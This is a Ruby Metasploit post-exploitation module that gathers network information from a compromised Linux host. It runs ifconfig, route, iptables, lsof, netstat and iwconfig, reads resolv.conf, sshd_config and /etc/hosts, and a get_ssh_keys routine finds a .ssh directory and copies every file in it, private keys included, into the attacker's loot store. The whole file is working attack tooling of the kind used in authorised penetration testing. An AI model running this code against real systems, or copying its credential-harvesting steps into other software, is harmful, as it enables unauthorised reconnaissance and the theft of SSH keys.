##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather Network Information',
        'Description'   => %q{
          This module gathers network information from the target system
          IPTables rules, interfaces, wireless information, open and listening
          ports, active network connections, DNS information and SSH information.},
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'ohdae <bindshell[at]live.com>', # minor additions, modifications & testing
            'Stephen Haywood <averagesecurityguy[at]gmail.com>', # enum_linux
          ],
        'Platform'      => ['linux'],
        'SessionTypes'  => ['shell', 'meterpreter']
      ))
  end

  # Run Method for when run command is issued
  def run
    host = get_host
    user = execute("/usr/bin/whoami")
    print_status("Module running as #{user}")


    # Collect data
    distro = get_sysinfo
    print_good("Info:")
    print_good("\t#{distro[:version]}")
    print_good("\t#{distro[:kernel]}")

    print_status("Collecting data...")

    nconfig = execute("/sbin/ifconfig -a")
    routes = execute("/sbin/route -e")
    iptables = execute("/sbin/iptables -L")
    iptables_nat = execute("/sbin/iptables -L -t nat")
    iptables_man = execute("/sbin/iptables -L -t mangle")
    resolv = cat_file("/etc/resolv.conf")
    sshd_conf = cat_file("/etc/ssh/sshd_config")
    hosts = cat_file("/etc/hosts")
    connections = execute("/usr/bin/lsof -nPi")
    wireless = execute("/sbin/iwconfig")
    open_ports = execute("/bin/netstat -tulpn")
    updown = execute("ls -R /etc/network")

    ssh_keys = get_ssh_keys

    # Save Enumerated data
    save("Network config", nconfig)
    save("Route table", routes)
    save("Firewall config", iptables + iptables_nat + iptables_man)
    save("DNS config", resolv)
    save("SSHD config", sshd_conf)
    save("Host file", hosts)
    save("SSH keys", ssh_keys) unless ssh_keys.empty?
    save("Active connections", connections)
    save("Wireless information", wireless)
    save("Listening ports", open_ports)
    save("If-Up/If-Down", updown)

  end

  # Save enumerated data
  def save(msg, data, ctype="text/plain")
    if data.nil? || data.include?('not found') || data.include?('cannot access')
      print_bad("Unable to get data for #{msg}")
      return
    end
    ltype = "linux.enum.network"
    loot = store_loot(ltype, ctype, session, data, nil, msg)
    print_good("#{msg} stored in #{loot.to_s}")
  end

  # Get host name
  def get_host
    case session.type
    when /meterpreter/
      host = sysinfo["Computer"]
    when /shell/
      host = cmd_exec("hostname").chomp
    end

    print_status("Running module against #{host}")

    return host
  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    return output
  end

  def cat_file(filename)
    vprint_status("Download: #{filename}")
    output = read_file(filename)
    return output
  end

  def get_ssh_keys
    keys = []

    #Look for .ssh folder, "~/" might not work everytime
    dirs = execute("/usr/bin/find / -maxdepth 3 -name .ssh").split("\n")
    ssh_base = ''
    dirs.each do |d|
      if d =~ /(^\/)(.*)\.ssh$/
        ssh_base = d
        break
      end
    end

    # We didn't find .ssh :-(
    return [] if ssh_base == ''

    # List all the files under .ssh/
    files = execute("/bin/ls -a #{ssh_base}").chomp.split()

    files.each do |k|
      next if k =~/^(\.+)$/
      this_key = cat_file("#{ssh_base}/#{k}")
      keys << this_key
    end

    return keys
  end
end
